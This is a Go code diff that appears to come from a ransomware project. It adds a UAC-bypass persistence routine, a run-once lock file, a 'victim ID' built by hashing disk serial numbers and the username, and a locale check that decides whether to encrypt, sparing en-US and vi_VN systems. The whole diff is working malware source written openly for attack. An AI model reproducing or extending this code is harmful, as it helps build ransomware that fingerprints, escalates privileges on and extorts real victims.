@@ -3,13 +3,21 @@ package main
 import (
 	"fmt"
 	"os"
+	"os/user"
 	"path/filepath"
+	"strings"
 	"syscall"
 	"time"
+
+	"github.com/jaypipes/ghw"
+	"github.com/jeandeaual/go-locale"
 )
 
-var LockFilePath = "g0_l4nG_1S_FuN_i5nT_1T.lock"
+var LockFileName = "g0_l4nG_1S_FuN_i5nT_1T.lock"
+var VictimID string
 
+// UAC Bypass + persistence.
+// Provide path to current executable
 func uacBypassPersist(path string) error {
 	fPath, err := filepath.Abs(path)
 	if err != nil {
@@ -35,7 +43,7 @@ func uacBypassPersist(path string) error {
 	return nil
 }
 
-// run-once file
+// creating run-once file
 func create_lock_file(filename string) (*os.File, error) {
 	if _, err := os.Stat(filename); err == nil {
 		err = os.Remove(filename)
@@ -47,6 +55,10 @@ func create_lock_file(filename string) (*os.File, error) {
 	return os.OpenFile(filename, os.O_CREATE|os.O_EXCL|os.O_RDWR, 0666)
 }
 
+/* return (nil, false) if another instance is running
+return (fileHandle, true) if no instance is running.
+
+NOTE: Make sure to close and delete this file before exit.*/
 func checkRunOnce(filename string) (*os.File, bool) {
 	filePointer, err := create_lock_file(filename)
 
@@ -54,15 +66,40 @@ func checkRunOnce(filename string) (*os.File, bool) {
 		// fmt.Println("someone is running")
 		return nil, false
 	}
-	return filePointer, true
-
-	// filePointer, runOnceResult := checkRunOnce(LockFilePath)
-
-	// if !runOnceResult {
-	// 	fmt.Println("Can't run. Someone is running")
-	// 	exit
-	// }
-
-	// defer os.Remove(LockFilePath) // defer executes backward
+	// filePointer, runOnceResult := checkRunOnce(LockFileName)
+	// defer os.Remove(LockFileName) // defer executes backward
 	// defer filePointer.Close()
+	return filePointer, true
+}
+
+func generateVictimID() (string, error) {
+	block, err := ghw.Block()
+	if err != nil {
+		return "", err
+	}
+	var victimID uint32 = 0
+	for _, disk := range block.Disks {
+		if victimID == 0 {
+			victimID = crc32Checksum([]byte(disk.SerialNumber), 0xDEADBEEF)
+		} else {
+			victimID = crc32Checksum([]byte(disk.SerialNumber), victimID)
+		}
+	}
+	user, err := user.Current()
+	if err != nil {
+		return "", err
+	}
+	victimID = crc32Checksum([]byte(user.Username), victimID)
+	victimIDString := fmt.Sprintf("%08x", victimID)
+	return strings.ToUpper(victimIDString), nil
+}
+
+// Check is false if language is not valid -> don't encrypt
+func languageCheck() (bool, error) {
+	userLocale, err := locale.GetLocale()
+	if err != nil {
+		return false, err
+	}
+
+	return userLocale != "en-US" && userLocale != "vi_VN", nil
 }
